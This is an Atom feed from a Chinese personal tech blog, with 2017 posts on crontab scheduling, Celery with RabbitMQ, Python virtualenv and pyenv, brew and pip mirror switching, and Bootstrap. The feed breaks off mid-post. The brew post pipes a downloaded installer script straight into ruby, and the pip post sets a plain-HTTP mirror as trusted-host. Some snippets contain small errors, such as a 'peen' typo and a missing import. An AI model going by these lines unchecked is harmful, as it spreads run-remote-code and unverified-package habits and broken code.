<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nMask&#39;s Blog</title>
  <subtitle>那一年，风陵渡口.......</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://thief.one/"/>
  <updated>2017-08-31T07:10:54.000Z</updated>
  <id>http://thief.one/</id>
  
  <author>
    <name>nMask</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>crontab计划任务</title>
    <link href="http://thief.one/2017/08/31/1/"/>
    <id>http://thief.one/2017/08/31/1/</id>
    <published>2017-08-31T06:55:02.000Z</published>
    <updated>2017-08-31T07:10:54.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光</blockquote>

<p>crontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。<br><a id="more"></a></p>
<h3 id="计划任务基本格式"><a href="#计划任务基本格式" class="headerlink" title="计划任务基本格式"></a>计划任务基本格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*　　*　　*　　*　　*　　<span class="built_in">command</span></div></pre></td></tr></table></figure>
<ul>
<li>分　时　日　月　周　命令 </li>
<li>第1列表示分钟1～59 每分钟用<em>或者</em>/1表示 </li>
<li>第2列表示小时1～23（0表示0点） </li>
<li>第3列表示日期1～31 </li>
<li>第4列表示月份1～12 </li>
<li>第5列标识号星期0～6（0表示星期天） </li>
<li>第6列要运行的命令</li>
</ul>
<h3 id="crontab-usage"><a href="#crontab-usage" class="headerlink" title="crontab usage"></a>crontab usage</h3><ul>
<li>crontab -h  查看命令帮助</li>
<li>crontab -e  编辑计划任务</li>
<li>sudo crontab -l   列出root的计划任务</li>
<li>crontab -u nmask -l 列出nmask的计划任务</li>
<li>crontab -r 删除计划任务</li>
</ul>
<p>一般写计划任务，都是运行crontab -e然后写入计划任务，保存退出即可。</p>
<h3 id="每秒执行"><a href="#每秒执行" class="headerlink" title="每秒执行"></a>每秒执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * sleep 10;</div></pre></td></tr></table></figure>
<p>每10s运行一次。</p>
<h3 id="crontab文件的一些例子"><a href="#crontab文件的一些例子" class="headerlink" title="crontab文件的一些例子"></a>crontab文件的一些例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">30 21 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每晚的21:30重启apache</div><div class="line"></div><div class="line">45 4 1,10,22 * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每月1、10、22日的4:45</div><div class="line"></div><div class="line">10 1 * * 6,0 /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每周六、日的1:10重启apache</div><div class="line"></div><div class="line">0,30 18-23 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示在每天18:00至23:00之间每隔30分钟重启apache。 </div><div class="line"></div><div class="line">0 23 * * 6 /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每星期六的11:00pm重启apache。 </div><div class="line"></div><div class="line">0 */1 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 每一小时重启apache </div><div class="line"></div><div class="line">0 23-7/1 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 晚上11点到早上7点之间，每隔一小时重启apache </div><div class="line"></div><div class="line">0 11 4 * mon-wed /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 每月的4号与每周一到周三的11点重启apache</div><div class="line"></div><div class="line">0 4 1 jan * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 一月一号的4点重启apache</div></pre></td></tr></table></figure>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * 每分钟执行</div><div class="line">1 * * * * 每小时执行一次</div></pre></td></tr></table></figure>
<p>注意上面2条计划任务，一个是每分钟执行，一个是每小时执行。</p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>如果不确定写的计划任务是否正确，可以在线测试：<a href="http://tool.lu/crontab/" target="_blank" rel="external">http://tool.lu/crontab/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光&lt;/blockquote&gt;

&lt;p&gt;crontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="crontab" scheme="http://thief.one/tags/crontab/"/>
    
  </entry>
  
  <entry>
    <title>celery分布式消息队列</title>
    <link href="http://thief.one/2017/08/25/1/"/>
    <id>http://thief.one/2017/08/25/1/</id>
    <published>2017-08-25T09:58:59.000Z</published>
    <updated>2017-08-25T12:50:08.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Quitters never win and winners never quit<br>退缩者永无胜利，胜利者永不退缩。</blockquote><br>　　之前在分布式消息队列上我一直使用rabbitmq+pika组合，然而由于对rabbitmq与pika理解不深，因此使用过程中遇到了很多坑。直到最近我决定重新研究下分布式消息队列，当然这次抛弃了pika，而选用celery。<br>　　回想之前我对pika与celery有过一些疑问，两者有何区别？又有何相同点？经过几天的研究，目前总算是清晰了一点，因此在此对celery+rabbitmq做个记录。<br><a id="more"></a></p>
<h3 id="安装celery"><a href="#安装celery" class="headerlink" title="安装celery"></a>安装celery</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install celery</div></pre></td></tr></table></figure>
<p>说明：celery只支持python2.7及以上版本，建议在虚拟环境中安装，如何构造虚拟环境可参考：<a href="https://thief.one/2017/08/24/2/">python虚拟环境</a></p>
<h3 id="Celery是如何工作的？"><a href="#Celery是如何工作的？" class="headerlink" title="Celery是如何工作的？"></a>Celery是如何工作的？</h3><p>我在此模拟几个角色来解释下celery+rabbitmq是如何工作的，脑洞来自网络，这里借鉴扩展一番。</p>
<p>假设目前D公司要开半年度工作会议，会议上要指定下半年工作计划，参会人员有老板（下发任务者）、部门主管（celery分配任务者）、部门员工（工作者）、老板秘书（沟通协调者，rabbitmq）。</p>
<h4 id="工作内容是什么？"><a href="#工作内容是什么？" class="headerlink" title="工作内容是什么？"></a>工作内容是什么？</h4><p>　　那么这场会议首先需要确定的是下半年的具体工作内容，这里就称之为“任务内容”。比如老板说我们下半年要开发出一个大数据平台，部门主管举手称赞，表示赞同，于是便愉快地定下了我们具体的工作任务（task），当然开发一个平台算是这个项目的总任务，其中可以细分成很多小的任务，比如大数据算法怎么写？界面怎么设计等。</p>
<h4 id="工作者在哪里？"><a href="#工作者在哪里？" class="headerlink" title="工作者在哪里？"></a>工作者在哪里？</h4><p>　　在确定了具体工作任务后，老板便把这个项目交给了部门主管（celery），而部门主管此时要确定谁去完成这项任务，它可以指定某个人（worker），也可以多个人。</p>
<h4 id="发布工作者在哪里？"><a href="#发布工作者在哪里？" class="headerlink" title="发布工作者在哪里？"></a>发布工作者在哪里？</h4><p>　　毫无疑问发布工作任务的人是老板（下发任务者），他指定了部门主管（celery）什么时候去完成哪些任务，并要求获取反馈信息。但有一点需要注意，老板只管布置任务，但不参与具体的任务分配，那这个任务分配的功能交给谁，没错就是部门主管，即celery。</p>
<h4 id="老板与员工如何沟通项目？"><a href="#老板与员工如何沟通项目？" class="headerlink" title="老板与员工如何沟通项目？"></a>老板与员工如何沟通项目？</h4><p>　　项目之初，老板通过电话将任务传递给部门主管，部门主管通过部门会议将任务分配给员工，过段时间再将任务结果反馈给老板。然而随着任务越来越多，部门主管就发现了一个问题，任务太多了，每个任务还要反馈结果，记不住，也容易弄乱，导致效率下降。<br>　　在召开会议商量了一番后，老板秘书站起来说：“我有个提议，老板每天将布置的任务写成一张纸条放到我这，然后部门主管每天早上来取并交给员工，至于纸条上的任务如何分配，部门主管决定就行，但是要将结果同样写一张纸条反馈给我，我再交给老板。这样老板只负责下发任务，我只负责保管任务纸条，部门主管只负责分配任务并获取反馈，员工只负责按任务工作。大家职责都很明确，效率肯定会更高。”至此，老板与员工的沟通问题也解决了。</p>
<h3 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h3><p>celery_con.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import Celery</div><div class="line">import time</div><div class="line"></div><div class="line">app = Celery(backend=<span class="string">'amqp'</span>, broker=<span class="string">'amqp://guest:guest@127.0.0.1:5672'</span>)</div></pre></td></tr></table></figure></p>
<p>说明：celery_con.py的作用是连接rabbitmq，注意这里是利用celery连接的rabbitmq。映射到场景中，就是秘书与主管，秘书与老板之间传递信息的通道。</p>
<p>task.py（任务内容）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from celery_con import app</div><div class="line"></div><div class="line">@app.task</div><div class="line">def <span class="built_in">test</span>(x, y):</div><div class="line">    time.sleep(5)</div><div class="line">    <span class="built_in">return</span> x + y</div><div class="line"></div><div class="line"></div><div class="line">@app.task</div><div class="line">def scan(x,y):</div><div class="line">    time.sleep(1)</div><div class="line">    <span class="built_in">return</span> x-y</div></pre></td></tr></table></figure></p>
<p>说明：task.py的功能是定制具体的任务，即“任务内容”，映射到场景中便是“开发一个大数据平台”，其中算法要怎么写？界面要如何设计等等。</p>
<p>celery（部门主管）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">celery -A task worker -c 2</div></pre></td></tr></table></figure></p>
<p>说明：此命令为开启work，分配任务；task就是task.py脚本的名称，表示work为task任务服务；-c 2表示同时开启2个work。映射到场景中，便是部门主管实时向秘书获取纸条，并分配给员工。</p>
<p>run.py（老板）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from task import <span class="built_in">test</span>,scan</div><div class="line"></div><div class="line">res=test.delay(2,2)</div><div class="line"><span class="built_in">print</span> res.get()</div></pre></td></tr></table></figure></p>
<p>说明：run.py的作用是下发消息到rabbitmq队列中，映射到场景中即老板将任务写在纸条上交给秘书。</p>
<p>运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python run.py</div></pre></td></tr></table></figure></p>
<p>而这里的秘书指的就是rabbitmq。</p>
<h3 id="celery与pika的区别"><a href="#celery与pika的区别" class="headerlink" title="celery与pika的区别"></a>celery与pika的区别</h3><p>　　简单来说，pika其实就是用来连接rabbitmq服务的一个python客户端模块，而rabbitmq本身只有消息存储功能，并没有任务的分配调度。当然在用pika连接rabbitmq的过程也可以任务分配，这需要利用pika模块自己写一个调度代码，也就是相当于自己写一个celery模块。<br>　　celery就是用来分配任务的，主要是做异步任务队列的，但是celery不具备存储的功能，因此需要一种介质去存储消息，所以常常与rabbitmq一起用。</p>
<h3 id="celery高级用法"><a href="#celery高级用法" class="headerlink" title="celery高级用法"></a>celery高级用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from task import scan</div><div class="line"></div><div class="line">r=scan.s(2,2)</div><div class="line">res=r.delay()</div><div class="line"><span class="built_in">print</span> res.get()</div></pre></td></tr></table></figure>
<p>并发的下发任务，也可以使用for循环。这里指的并发，并不是所有任务一起执行，而是所有任务都下发到队列，而执行的并发数量，取决于work的数量。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import group</div><div class="line">from task import scan</div><div class="line">g=group( scan.s(i,i) <span class="keyword">for</span> i <span class="keyword">in</span> range(10)).delay()</div><div class="line"><span class="built_in">print</span> g.get()</div></pre></td></tr></table></figure></p>
<p>说明：celery高级用法还有很多，本文将会持续更新……</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Quitters never win and winners never quit&lt;br&gt;退缩者永无胜利，胜利者永不退缩。&lt;/blockquote&gt;&lt;br&gt;　　之前在分布式消息队列上我一直使用rabbitmq+pika组合，然而由于对rabbitmq与pika理解不深，因此使用过程中遇到了很多坑。直到最近我决定重新研究下分布式消息队列，当然这次抛弃了pika，而选用celery。&lt;br&gt;　　回想之前我对pika与celery有过一些疑问，两者有何区别？又有何相同点？经过几天的研究，目前总算是清晰了一点，因此在此对celery+rabbitmq做个记录。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="celery" scheme="http://thief.one/tags/celery/"/>
    
  </entry>
  
  <entry>
    <title>python虚拟环境</title>
    <link href="http://thief.one/2017/08/24/2/"/>
    <id>http://thief.one/2017/08/24/2/</id>
    <published>2017-08-24T06:41:44.000Z</published>
    <updated>2017-08-24T07:24:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">总有一条蜿蜒在童话镇里七彩的河</blockquote><br>　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。<br><a id="more"></a></p>
<h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h3><p>virtualenv是跨平台的，linux、mac、windows都可以使用。</p>
<h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install virtualenv</div></pre></td></tr></table></figure>
<h4 id="创建虚拟目录"><a href="#创建虚拟目录" class="headerlink" title="创建虚拟目录"></a>创建虚拟目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virtualenv kvenv -p /usr/bin/python2</div></pre></td></tr></table></figure>
<p>说明：创建完成后会生成一个kvenv目录，可以加上-p参数指定Python版本。（当然要系统安装了某版本的python才能创建这个版本的虚拟目录）</p>
<h4 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> kvenv/bin/activate</div></pre></td></tr></table></figure>
<h4 id="退出虚拟环境"><a href="#退出虚拟环境" class="headerlink" title="退出虚拟环境"></a>退出虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deactivate</div></pre></td></tr></table></figure>
<h4 id="查看python路径"><a href="#查看python路径" class="headerlink" title="查看python路径"></a>查看python路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">which</span> python <span class="comment"># 看python路径是否为新创建的虚拟目录</span></div></pre></td></tr></table></figure>
<p>说明：Mac、linux与windows上安装使用方法一样。</p>
<h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>pyenv严格来说是python的版本控制器，使用很灵活。</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ brew update</div><div class="line">$ brew install peen</div></pre></td></tr></table></figure>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'eval "$(pyenv init -)"'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
<li>pyenv version # 当前版本</li>
<li>pyenv versions # 所有版本</li>
<li>pyenv global system # 全局切换</li>
<li>pyenv local 2.7.10 # 本地切换</li>
<li>pyenv local 3.5.0 –unset # 取消切换</li>
</ul>
<p>pyenv常用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ pyenv install --list <span class="comment">#列出可安装版本</span></div><div class="line">$ pyenv install &lt;version&gt; <span class="comment"># 安装对应版本</span></div><div class="line">$ pyenv versions <span class="comment"># 显示当前使用的python版本</span></div><div class="line">$ pyenv <span class="built_in">which</span> python <span class="comment"># 显示当前python安装路径</span></div><div class="line">$ pyenv global &lt;version&gt; <span class="comment"># 设置默认Python版本</span></div><div class="line">$ pyenv <span class="built_in">local</span> &lt;version&gt; <span class="comment"># 当前路径创建一个.python-version, 以后进入这个目录自动切换为该版本</span></div><div class="line">$ pyenv shell &lt;version&gt; <span class="comment"># 当前shell的session中启用某版本，优先级高于global 及 local</span></div></pre></td></tr></table></figure></p>
<p>安装其他版本python<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pyenv install xx.xx.xx (pyenv install 3.4.3) <span class="comment">#安装python3.4.3</span></div><div class="line">pyenv <span class="built_in">rehash</span>   <span class="comment"># 安装完以后记得一定要rehash</span></div></pre></td></tr></table></figure></p>
<h3 id="virtualenv-or-pyenv"><a href="#virtualenv-or-pyenv" class="headerlink" title="virtualenv or pyenv ?"></a>virtualenv or pyenv ?</h3><p>如果是项目环境，建议virtualenv，环境独立，也不会有很大的Bug。<br>如果只是个人学习练习python，可以使用pyenv，切换方便。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;总有一条蜿蜒在童话镇里七彩的河&lt;/blockquote&gt;&lt;br&gt;　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="http://thief.one/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Brew、Pip更换国内源</title>
    <link href="http://thief.one/2017/08/24/1/"/>
    <id>http://thief.one/2017/08/24/1/</id>
    <published>2017-08-24T06:41:28.000Z</published>
    <updated>2017-08-24T08:10:47.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">翻过人山人海</blockquote><br>　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。<br><a id="more"></a></p>
<h3 id="brew"><a href="#brew" class="headerlink" title="brew"></a>brew</h3><p>brew是mac上的包管理工具，类似于ubuntu上的apt-get，centos上的yum。</p>
<h4 id="安装brew"><a href="#安装brew" class="headerlink" title="安装brew"></a>安装brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -e <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></div></pre></td></tr></table></figure>
<h4 id="使用brew"><a href="#使用brew" class="headerlink" title="使用brew"></a>使用brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install</div></pre></td></tr></table></figure>
<h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><p>brew默认的源速度太慢了，有时还会被墙……，可以替换成国内的源，这里演示的是中科大的源。</p>
<h5 id="替换brew-git"><a href="#替换brew-git" class="headerlink" title="替换brew.git"></a>替换brew.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/brew.git</div></pre></td></tr></table></figure>
<h5 id="替换homebrew-core-git"><a href="#替换homebrew-core-git" class="headerlink" title="替换homebrew-core.git"></a>替换homebrew-core.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</div></pre></td></tr></table></figure>
<h5 id="替换Homebrew-Bottles源"><a href="#替换Homebrew-Bottles源" class="headerlink" title="替换Homebrew Bottles源"></a>替换Homebrew Bottles源</h5><p>对于bash用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure></p>
<p>对于zsh用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.zshrc</div><div class="line"><span class="built_in">source</span> ~/.zshrc</div></pre></td></tr></table></figure></p>
<p>说明：建议以上三个源都替换一下，然后brew update 更新一下。</p>
<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><p>pip是python的包管理工具，类似node.js的npm管理工具。</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-pip</div></pre></td></tr></table></figure>
<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wget <span class="string">"https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz#md5=834b2904f92d46aaa333267fb1c922bb"</span></div><div class="line">解压以后，进入setuptools文件目录下运行sudo python setup.py install。</div><div class="line">然后进入pip文件目录下运行sudo python setup.py install。</div></pre></td></tr></table></figure></p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
<li>pip list  # 列出所有安装的库</li>
<li>pip list –outdated # 列出所有过期的库</li>
<li>pip install –upgrade 库名  # 更新库</li>
<li>pip install –upgrade pip  # 更新pip自身</li>
<li>pip freeze # 查看安装了哪些包</li>
<li>pip install -t /usr/local/lib/python2.7/site-packages/ xlrd # 给指定版本的python安装库</li>
<li>pip install jieba -i <a href="https://pypi.douban.com/simple" target="_blank" rel="external">https://pypi.douban.com/simple</a>  # 单次使用国内源安装</li>
</ul>
<h4 id="替换pip源"><a href="#替换pip源" class="headerlink" title="替换pip源"></a>替换pip源</h4><p>国外源的速度在国内下载实在太慢，因此需要更改镜像源，可以改成阿里云或者豆瓣的镜像。</p>
<h5 id="临时使用国内源"><a href="#临时使用国内源" class="headerlink" title="临时使用国内源"></a>临时使用国内源</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install jieba -i https://pypi.douban.com/simple  <span class="comment"># 单次使用国内源安装</span></div></pre></td></tr></table></figure>
<ul>
<li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="external">http://mirrors.aliyun.com/pypi/simple/</a> </li>
<li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">https://pypi.mirrors.ustc.edu.cn/simple/</a> </li>
<li>豆瓣 <a href="http://pypi.douban.com/simple/" target="_blank" rel="external">http://pypi.douban.com/simple/</a> </li>
<li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="external">https://pypi.tuna.tsinghua.edu.cn/simple/</a> </li>
<li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">http://pypi.mirrors.ustc.edu.cn/simple/</a></li>
</ul>
<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>编辑pip.cofig文件，文件位置(若不存在则新建一个)：</p>
<ul>
<li>mac:~/.pip/pip.conf</li>
<li>linux:~/.pip/pip.conf</li>
<li>windows:%HOMEPATH%\pip\pip.ini</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url=http://mirrors.aliyun.com/pypi/simple/</div><div class="line"></div><div class="line">[install]</div><div class="line">trusted-host=mirrors.aliyun.com</div></pre></td></tr></table></figure>
<p>保存退出即可。</p>
<h5 id="pip报错处理"><a href="#pip报错处理" class="headerlink" title="pip报错处理"></a>pip报错处理</h5><p>错误信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OSError: [Errno 1] Operation not permitted:</div></pre></td></tr></table></figure></p>
<p>解决方案:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install --upgrade pip</div><div class="line">sudo pip install numpy   --ignore-installed</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;翻过人山人海&lt;/blockquote&gt;&lt;br&gt;　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Brew" scheme="http://thief.one/tags/Brew/"/>
    
      <category term="git" scheme="http://thief.one/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>bootstrap前端框架</title>
    <link href="http://thief.one/2017/08/23/1/"/>
    <id>http://thief.one/2017/08/23/1/</id>
    <published>2017-08-23T08:47:34.000Z</published>
    <updated>2017-08-23T09:13:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Let bygones be bygones<br>过去的就让它过去吧</blockquote><br>　　现在Web前端的技术发展得很快，web页面做得越来越炫目。然而作为一名”后端程序员”，不会写css，写不好javascript，不懂jquery怎么办？没关系，本篇将介绍前端开发神器–bootstrap，学会它立马变身前端达人。（题外话：我也是被前端开发搞得心力憔悴后，才发现有这个框架，用起来简直爽！）<br><a id="more"></a></p>
<h3 id="Who-is-bootstrap"><a href="#Who-is-bootstrap" class="headerlink" title="Who is bootstrap?"></a>Who is bootstrap?</h3><p>　　Bootstrap是由Twitter的Mark Otto和Jacob Thornton开发的，在2011年八月发布的开源产品。Bootstrap是一个用于快速开发Web应用程序和网站的前端框架，其基于 HTML、CSS、JAVASCRIPT。<br>　　简单来说，Bootstrap相当于一个封装好的前端模块，而模块中的方法（函数）涵盖了html、css、javascript，封装的功能包含常用的布局、颜色等，直接调用即可。</p>
